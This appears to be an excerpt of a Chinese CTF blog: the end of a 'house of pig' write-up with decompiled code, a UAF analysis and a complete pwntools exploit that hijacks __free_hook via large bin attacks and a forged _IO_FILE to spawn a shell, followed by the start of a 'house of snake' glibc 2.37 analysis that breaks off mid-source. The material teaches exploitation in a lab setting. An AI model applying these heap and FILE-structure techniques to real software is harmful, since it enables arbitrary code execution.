__readfsqword(0x28u) ^ v12;&#125;\n\n可以看到这里虽然是记录了上一个chunk的size但是并没有让后面的chunk的size必须大于等于上一个的。而且这里输入内容是这样的sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);\n通过上面可以看到peppa能够创建20个chunk，但是mummy只能创建10个chunk，最后的daddy只能创建5个chunk，并且最后一个chunk还是固定大小但是可以连续的写入内容。另外三个角色创建的最大chunk的size分别为：0x430，0x450，0x440 并且可以看到上面只存在calloc来申请chunk\n三个的show函数都挺类似：\nunsigned __int64 __fastcall show_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int v4; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v4 = input_int();  if ( v4 &gt;= 0 &amp;&amp; v4 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v4) &amp;&amp; *(a1 + 4 * (v4 + 48LL)) &amp;&amp; !*(a1 + v4 + 288) )    &#123;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;The message is: &quot;);      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, *(a1 + 8LL * v4));      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n可以看到show函数只是验证了，chunk_arr不为空，chunk_size不为空，并且chunk_exist==0\n再看edit函数：\nunsigned __int64 __fastcall edit_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int i; // [rsp+18h] [rbp-18h]  int v5; // [rsp+1Ch] [rbp-14h]  int v6; // [rsp+20h] [rbp-10h]  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v5 = input_int();  if ( v5 &gt;= 0 &amp;&amp; v5 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v5) &amp;&amp; *(a1 + 4 * (v5 + 48LL)) &amp;&amp; !*(a1 + v5 + 288) )    &#123;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Peppa&#x27;s message: &quot;);      v6 = *(a1 + 4 * (v5 + 48LL)) / 48;      for ( i = 0; i &lt; v6 &amp;&amp; !sub_2DBC((*(a1 + 8LL * v5) + 48 * i), 16LL); ++i )        ;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v7;&#125;\n\n这是peppa的edit函数，这里的输入方式其实和再创建chunk的时候是一样的，并且验证的方式和show函数一样。\n最后就是delete函数：\nunsigned __int64 __fastcall delete_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  int v4; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message index: &quot;);  v4 = input_int();  if ( v4 &gt;= 0 &amp;&amp; v4 &lt;= 19 )  &#123;    if ( *(a1 + 8LL * v4) &amp;&amp; !*(a1 + v4 + 288) &amp;&amp; !*(a1 + v4 + 312) )    &#123;      free(*(a1 + 8LL * v4));      *(a1 + v4 + 288) = 1;      *(a1 + v4 + 312) = 1;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  else  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error index!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n可以看到这里验证就是chunk_arr不为空，chunk_exist==0，chunk_freed==0，free之后将后面两个置为1。\n在最后的更换身份的时候需要先验证密码：\n__int64 check_pass()&#123;  __int64 v0; // rax  __int64 v2; // rax  __int64 v3; // rax  unsigned int v4; // [rsp+Ch] [rbp-114h]  _DWORD v5[24]; // [rsp+10h] [rbp-110h] BYREF  char s[80]; // [rsp+70h] [rbp-B0h] BYREF  char v7[88]; // [rsp+C0h] [rbp-60h] BYREF  unsigned __int64 v8; // [rsp+118h] [rbp-8h]  v8 = __readfsqword(0x28u);  v0 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;Please enter the identity password of the corresponding user:&quot;);  std::ostream::operator&lt;&lt;(v0, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  memset(s, 0, sizeof(s));  memset(v7, 0, 0x50uLL);  sub_2D09(s, 64LL);  v4 = strlen(s);  if ( !v4 )  &#123;    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;What&#x27;s this?&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    exit(-1);  &#125;  ((&amp;sub_13C8 + 1))();  sub_2916(v5, s, v4);  sub_2A8B(v5, v7);  if ( !memcmp(v7, &amp;unk_6906, 0x11uLL) || !memcmp(v7, &amp;unk_6917, 0x11uLL) || !strcmp(v7, &quot;&lt;D&quot;) )  &#123;    if ( s[0] == 0x43 )      return 3LL;    if ( s[0] - 0x41 &lt;= 2 )    &#123;      if ( s[0] == 0x41 )        return 1LL;      if ( s[0] == 0x42 )        return 2LL;    &#125;  &#125;  v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Couldn&#x27;t find this password!&quot;);  std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  return 0LL;&#125;\n\n这里s为我们输入的内容，v7为经过md5加密之后的内容，所以只要满足md5之后以’&lt;D’开头即可进入下面\n&#123;    &quot;Peppa&quot;: &quot;A\\x01\\x95\\xc9\\x1c&quot;,    &quot;Mummy&quot;: &quot;B\\x01\\x87\\xc3\\x19&quot;,    &quot;Daddy&quot;: &quot;C\\x01\\xf7\\x3c\\x32&quot;&#125;\t\n\n根据将角色状态复制给变量的过程可以看出来包括所有角色的结构体其实是：\nstruct all_pig&#123;    Peppa_chunk_arr[24];   size: 0xc0    Peppa_chunk_size[24];  size: 0x60    Peppa_chunk_exist[24]; size: 0x18    Peppa_chunk_freed[24]; size: 0x18    Peppa_last_chunk_size; size: 0x4    padding;               size: 0x4    Mummy_chunk_arr[24];   size: 0xc0    Mummy_chunk_size[24];  size: 0x60    Mummy_chunk_exist[24]; size: 0x18    Mummy_chunk_freed[24]; size: 0x18    Mummy_last_chunk_size; size: 0x4    padding;               size: 0x4    Daddy_chunk_arr[24];   size: 0xc0    Daddy_chunk_size[24];  size: 0x60    Daddy_chunk_exist[24]; size: 0x18    Daddy_chunk_freed[24]; size: 0x18    Daddy_last_chunk_size; size: 0x4    padding;               size: 0x4&#125;\n\n将all_pig的内容给pig的内容的过程是：\nunsigned __int64 __fastcall sub_3BEC(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  memcpy(a1, users, 0xC0uLL);  memcpy((a1 + 0xC0), users + 0xC0, 0x60uLL);  memcpy((a1 + 0x120), users + 0x120, 0x18uLL);  memcpy((a1 + 0x138), users + 0x138, 0x18uLL);  return __readfsqword(0x28u) ^ v2;&#125;\n\n可以看到是将结构体的每一部分都给到了单个pig，但是在切换角色时储存单个pig的函数：\nunsigned __int64 __fastcall sub_3B3E(__int64 a1)&#123;  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  memcpy(users, a1, 0xC0uLL);  memcpy(users + 192, (a1 + 192), 0x60uLL);  memcpy(users + 312, (a1 + 312), 0x18uLL);  return __readfsqword(0x28u) ^ v2;&#125;\n\n可以看到这里出现了问题，他并没有将chunk_exist赋值过去，所以就造成了UAF漏洞。\n利用分析利用思路其实就是首先泄漏出libc地址，接着泄漏heap地址，利用tcache stashing unlink attack+和large bin attack实现在free_hook附近分配chunk，但是由于calloc不能够直接申请tcache当中的chunk，所以我们需要第二次利用large bin attack修改掉_IO_list_all，并且这里写入的堆地址必须是第三个用户的堆地址，这里我们再改变_chain到我们最后的gift堆块，最后在gift堆块伪造_IO_FILE结构体。\n泄漏libc地址&amp;heap地址create(0x150, b&#x27;\\n&#x27;*7)  # A0for i in range(7):    create(0x150, b&#x27;\\n&#x27;*7)  # A7    delete(i+1)delete(0)change(2)change(1)show(0)r.recvuntil(b&#x27;The message is: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]edit(1, b&#x27;a&#x27;*7)show(1)r.recvuntil(b&#x27;The message is: aaaaaaa\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(hex(heap_base))\n\n为tcache stashing unlink attack做准备change(2)for i in range(5):    create(0x90, b&#x27;\\n&#x27;*3)  # B4    delete(i)change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A8create(0x150, b&#x27;\\n&#x27;*7)  # A9create(0x150, b&#x27;\\n&#x27;*7)  # A10delete(8)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B5change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A11delete(10)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B6create(0x410, b&#x27;\\n&#x27;*21)  # B7change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A12change(2)create(0x410, b&#x27;\\n&#x27;*22)  # B8change(1)edit(10, b&#x27;a&#x27;*0x40+p64(heap_base+0x12c40) +     p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x20))\n\n第一次large bin attackcreate(0x150, b&#x27;\\n&#x27;*7)  # A13change(2)create(0x420, b&#x27;\\n&#x27;*22)  # B9change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A14change(2)delete(9)change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A15change(2)delete(8)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x28))change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A16change(3)create(0x410, b&#x27;\\n&#x27;*21)  # C0\n\n第二次large bin attackchange(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]-0x20))change(3)delete(0)create(0x430, b&#x27;\\n&#x27;*22)  # C1create(0x440, b&#x27;\\n&#x27;*22)  # C2\n\n修改_chain的指向payload = b&#x27;\\x00&#x27;*0x18+p64(heap_base+0x13c00)payload = payload.ljust(0x158, b&#x27;\\x00&#x27;)create(0x410, payload)  # C3\n\n伪造IO_FILE结构def pack_file(_IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _IO_buf_end=0, vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&quot;Gift:&quot;)_IO_str_jumps = libc_base+0x1ed560system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(1, 0xffffffffffff, heap_base +                        0x13c00+0xe0, heap_base+0x13c00+0xe0+0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27;+p64(system_addr)*2print(hex(len(file_struct[0x10:])))r.sendline(file_struct[0x10:])\n\n这里解释一下为什么这么构造，把源码扒过来：\nint_IO_str_overflow (FILE *fp, int c)&#123;  int flush_only = c == EOF;  size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    &#123;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;    &#125;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))    &#123;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */\treturn EOF;      else\t&#123;\t  char *new_buf;\t  char *old_buf = fp-&gt;_IO_buf_base;\t  size_t old_blen = _IO_blen (fp);\t  size_t new_size = 2 * old_blen + 100;\t  if (new_size &lt; old_blen)\t    return EOF;\t  new_buf = malloc (new_size);\t  if (new_buf == NULL)\t    &#123;\t      /*\t  __ferror(fp) = 1; */\t      return EOF;\t    &#125;\t  if (old_buf)\t    &#123;\t      memcpy (new_buf, old_buf, old_blen);\t      free (old_buf);\t      /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */\t      fp-&gt;_IO_buf_base = NULL;\t    &#125;\t......&#125;\n\n#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)\n\n可以看到这里的old_buf也就是fp-&gt;_IO_buf_base然后old_blen也可以看到上面的定义，所以我们需要构造两个差值为0x18，并且我们可以看到，我们复制的内容也是从old_buf开始的，然后我们分配的tcahce其实是需要写三个p64才能修改到free_hook。\n\n我们这里的思路其实就是修改free_hook为system，那么我们free的时候就需要参数为/bin/sh所以我们old_buf就这样确定了，所以在构造结构体时后面跟了两个p64(system)这里和前面的不一样。\n所以综上得出，expfrom pwn import *elf = ELF(&#x27;./pig&#x27;)r = process(&#x27;./pig&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;&#x27;&#x27;&#x27;struct pig&#123;    chunk_arr[24];    chunk_size[24];    chunk_exist[24];    chunk_freed[24];&#125;struct all_pig&#123;    Peppa_chunk_arr[24];   size: 0xc0    Peppa_chunk_size[24];  size: 0x60    Peppa_chunk_exist[24]; size: 0x18    Peppa_chunk_freed[24]; size: 0x18    Peppa_last_chunk_size; size: 0x4    padding;               size: 0x4    Mummy_chunk_arr[24];   size: 0xc0    Mummy_chunk_size[24];  size: 0x60    Mummy_chunk_exist[24]; size: 0x18    Mummy_chunk_freed[24]; size: 0x18    Mummy_last_chunk_size; size: 0x4    padding;               size: 0x4    Daddy_chunk_arr[24];   size: 0xc0    Daddy_chunk_size[24];  size: 0x60    Daddy_chunk_exist[24]; size: 0x18    Daddy_chunk_freed[24]; size: 0x18    Daddy_last_chunk_size; size: 0x4    padding;               size: 0x4&#125;password&#123;    Peppa: A\\x01\\x95\\xc9\\x1c    Mummy: B\\x01\\x87\\xc3\\x19    Daddy: C\\x01\\xf7\\x3c\\x32&#125;&#x27;&#x27;&#x27;def create(size, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Input the message size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;&#x27;s message: &quot;)    r.sendline(content)def show(idx):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;&#x27;s message: &quot;)    r.sendline(content)def delete(idx):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Input the message index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def change(role):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;5&#x27;)    r.recvuntil(b&#x27;Please enter the identity password of the corresponding user:&#x27;)    if role == 1:        r.sendline(b&#x27;A\\x01\\x95\\xc9\\x1c&#x27;)    elif role == 2:        r.sendline(b&#x27;B\\x01\\x87\\xc3\\x19&#x27;)    else:        r.sendline(b&#x27;C\\x01\\xf7\\x3c\\x32&#x27;)create(0x150, b&#x27;\\n&#x27;*7)  # A0for i in range(7):    create(0x150, b&#x27;\\n&#x27;*7)  # A7    delete(i+1)delete(0)change(2)change(1)show(0)r.recvuntil(b&#x27;The message is: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]edit(1, b&#x27;a&#x27;*7)show(1)r.recvuntil(b&#x27;The message is: aaaaaaa\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(hex(heap_base))change(2)for i in range(5):    create(0x90, b&#x27;\\n&#x27;*3)  # B4    delete(i)change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A8create(0x150, b&#x27;\\n&#x27;*7)  # A9create(0x150, b&#x27;\\n&#x27;*7)  # A10delete(8)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B5change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A11delete(10)change(2)create(0xb0, b&#x27;\\n&#x27;*2)  # B6create(0x410, b&#x27;\\n&#x27;*21)  # B7change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A12change(2)create(0x410, b&#x27;\\n&#x27;*22)  # B8change(1)edit(10, b&#x27;a&#x27;*0x40+p64(heap_base+0x12c40) +     p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x20))create(0x150, b&#x27;\\n&#x27;*7)  # A13change(2)create(0x420, b&#x27;\\n&#x27;*22)  # B9change(1)create(0x150, b&#x27;\\n&#x27;*7)  # A14change(2)delete(9)change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A15change(2)delete(8)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]-0x28))change(1)create(0x430, b&#x27;\\n&#x27;*22)  # A16change(3)create(0x410, b&#x27;\\n&#x27;*21)  # C0# create(0x90, b&#x27;\\n&#x27;*3)  # C1change(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)edit(9, p64(0)+p64(libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]-0x20))change(3)delete(0)create(0x430, b&#x27;\\n&#x27;*22)  # C1create(0x440, b&#x27;\\n&#x27;*22)  # C2change(2)edit(9, p64(heap_base+0x13680)*2)edit(8, p64(heap_base+0x13c00)*2)change(3)payload = b&#x27;\\x00&#x27;*0x18+p64(heap_base+0x13c00)payload = payload.ljust(0x158, b&#x27;\\x00&#x27;)create(0x410, payload)  # C3create(0x90, b&#x27;\\n&#x27;*2)  # C4def pack_file(_IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _IO_buf_end=0, vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&quot;Gift:&quot;)_IO_str_jumps = libc_base+0x1ed560system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(1, 0xffffffffffff, heap_base +                        0x13c00+0xe0, heap_base+0x13c00+0xe0+0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27;+p64(system_addr)*2print(hex(len(file_struct[0x10:])))r.sendline(file_struct[0x10:])gdb.attach(r)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;5&#x27;)r.sendline(b&#x27;&#x27;)r.interactive()\n\n\n附件链接：https://github.com/01dwang/house_of_pig\n","categories":["pwn"],"tags":["house of pig","house of 系列"]},{"title":"house of snake","url":"/2023/03/22/house-of-snake/","content":"这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。\n背景介绍在glibc2.37中_IO_obstack_jumps被删除啦，导致前一篇的利用方式无了。\n原理分析这次聚焦的vtable是:\nstatic const struct _IO_jump_t _IO_printf_buffer_as_file_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, NULL),  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),  JUMP_INIT(underflow, NULL),  JUMP_INIT(uflow, NULL),  JUMP_INIT(pbackfail, NULL),  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),  JUMP_INIT(xsgetn, NULL),  JUMP_INIT(seekoff, NULL),  JUMP_INIT(seekpos, NULL),  JUMP_INIT(setbuf, NULL),  JUMP_INIT(sync, NULL),  JUMP_INIT(doallocate, NULL),  JUMP_INIT(read, NULL),  JUMP_INIT(write, NULL),  JUMP_INIT(seek, NULL),  JUMP_INIT(close, NULL),  JUMP_INIT(stat, NULL),  JUMP_INIT(showmanyc, NULL),  JUMP_INIT(imbue, NULL)&#125;;\n\n可以看到这里只有两个函数，并且我们真正使用的只有第一个函数:\nstatic int__printf_buffer_as_file_overflow (FILE *fp, int ch)&#123;  struct __printf_buffer_as_file *file = (struct __printf_buffer_as_file *) fp;  __printf_buffer_as_file_commit (file);  /* EOF means only a flush is requested.   */  if (ch != EOF)    __printf_buffer_putc (file-&gt;next, ch);  /* Ensure that flushing actually produces room.  */  if (!__printf_buffer_has_failed (file-&gt;next)      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)    __printf_buffer_flush (file-&gt;next);  __printf_buffer_as_file_switch_to_buffer (file);  if (!__printf_buffer_has_failed (file-&gt;next))    return (unsigned char) ch;  else    return EOF;&#125;\n\n这个函数一来就是一个强制类型转化为__printf_buffer_as_file结构体。\nstruct __printf_buffer_as_file&#123;  /* Interface to libio.  */  FILE stream;  const struct _IO_jump_t *vtable;   /* Pointer to the underlying buffer.  */  struct __printf_buffer *next;&#125;;\n\n可以看到这个结构体的前面两个成员其实就相当于_IO_FILE_plus结构体，再在后面跟了一个指针。\n这个函数的目标是执行到__printf_buffer_flush，所以需要通过前面的验证。\nstatic void__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)&#123;  /* Check that the write pointers in the file stream are consistent     with the next buffer.  */  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);   file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;&#125;static inline void__printf_buffer_putc (struct __printf_buffer *buf, char ch)&#123;  if (buf-&gt;write_ptr != buf-&gt;write_end)      *buf-&gt;write_ptr++ = ch;  else    __printf_buffer_putc_1 (buf, ch);&#125;\n\n这里第一个函数中就是验证了next指针的内容。\nstruct __printf_buffer&#123;  char *write_base;  char *write_ptr;  char *write_end;  uint64_t written;  /* Identifies the flush callback.  */  enum __printf_buffer_mode mode;&#125;;\n\n成功绕过上面的判断之后进入下面这个函数:\nstatic void__printf_buffer_do_flush (struct __printf_buffer *buf)&#123;  switch (buf-&gt;mode)    &#123;    case __printf_buffer_mode_failed:    case __printf_buffer_mode_sprintf:      return;    case __printf_buffer_mode_snprintf:      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);      return;    case __printf_buffer_mode_sprintf_chk:      __chk_fail ();      break;    case __printf_buffer_mode_to_file:      __printf_buffer_flush_to_file ((struct __printf_buffer_to_file *) buf);      return;    case __printf_buffer_mode_asprintf:      __printf_buffer_flush_asprintf ((struct __printf_buffer_asprintf *) buf);      return;    case __printf_buffer_mode_dprintf:      __printf_buffer_flush_dprintf ((struct __printf_buffer_dprintf *) buf);      return;    case __printf_buffer_mode_strfmon:      __set_errno (E2BIG);      __printf_buffer_mark_failed (buf);      return;    case __printf_buffer_mode_fp:      __printf_buffer_flush_fp ((struct __printf_buffer_fp *) buf);      return;    case __printf_buffer_mode_fp_to_wide:      __printf_buffer_flush_fp_to_wide        ((struct __printf_buffer_fp_to_wide *) buf);      return;    case __printf_buffer_mode_fphex_to_wide:      __printf_buffer_flush_fphex_to_wide        ((struct __printf_buffer_fphex_to_wide *) buf);      return;    case __printf_buffer_mode_obstack:      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);      return;    &#125;  __builtin_trap ();&#125;\n\n这里最终目标是__printf_buffer_flush_obstack函数。\nvoid__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)&#123;  /* About to switch buffers, so record the bytes written so far.  */  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;  if (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1)    &#123;      /* Errors are reported via a callback mechanism (presumably for\t process termination).  */      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);      buf-&gt;base.write_base = obstack_next_free (buf-&gt;obstack);      buf-&gt;base.write_ptr = buf-&gt;base.write_base;      size_t size = obstack_room (buf-&gt;obstack);      buf-&gt;base.write_end = buf-&gt;base.write_ptr + size;      /* Reserve the space on the obstack size.  */      obstack_blank_fast (buf-&gt;obstack, size);    &#125;  else    &#123;      /* Obtain the extra character.  */      buf-&gt;base.write_base = &amp;buf-&gt;ch;      buf-&gt;base.write_ptr = &amp;buf-&gt;ch;      buf-&gt;base.write_end = &amp;buf-&gt;ch + 1;    &#125;&#125;\n\n这个函数的目标就是obstack_1grow，前面的绕过方式很简单，直接绕过就行。\n# define obstack_1grow(OBSTACK, datum)\t\t\t\t\t      \\  __extension__\t\t\t\t\t\t\t\t      \\    (&#123; struct obstack *__o = (OBSTACK);\t\t\t\t\t      \\       if (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)\t\t\t      \\\t _obstack_newchunk (__o, 1);\t\t\t\t\t      \\       obstack_1grow_fast (__o, datum);\t\t\t\t\t      \\       (void) 0; &#125;)\n\n然后执行这个宏，宏中就有了我们熟悉的_obstack_newchunk函数了。\nvoid_obstack_newchunk (struct obstack *h, int length)&#123;  struct _obstack_chunk *old_chunk = h-&gt;chunk;  struct _obstack_chunk *new_chunk;  long new_size;  long obj_size = h-&gt;next_free - h-&gt;object_base;  long i;  long already;  char *object_base;  /* Compute size for new chunk.  */  new_size = (obj_size + length) + (obj_size &gt;&gt; 3) + h-&gt;alignment_mask + 100;  if (new_size &lt; h-&gt;chunk_size)    new_size = h-&gt;chunk_size;  /* Allocate and initialize the new chunk.  */  new_chunk = CALL_CHUNKFUN (h, new_size);  if (!new_chunk)    (*obstack_alloc_failed_handler)();  h-&gt;chunk = new_chunk;  new_chunk-&gt;prev = old_chunk;  new_chunk-&gt;limit = h-&gt;chunk_limit = (char *) new_chunk + new_size;  /* Compute an aligned object_base in the new chunk */  object_base =    __PTR_ALIGN ((char *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);  /* Move the existing object to the new chunk.     Word at a time is fast and is safe if the object     is sufficiently aligned.  */  if (h-&gt;alignment_mask + 1 &gt;= DEFAULT_ALIGNMENT)    &#123;      for (i = obj_size / sizeof (COPYING_UNIT) - 1;\t   i &gt;= 0; i--)\t((COPYING_UNIT *) object_base)[i]\t  = ((COPYING_UNIT *) h-&gt;object_base)[i];      /* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,\t but that can cross a page boundary on a machine\t which does not do strict alignment for COPYING_UNITS.  */      already = obj_size / sizeof (COPYING_UNIT) * sizeof (COPYING_UNIT);    &#125;  else    already = 0;  /* Copy remaining bytes one by one.  */  for (i = already; i 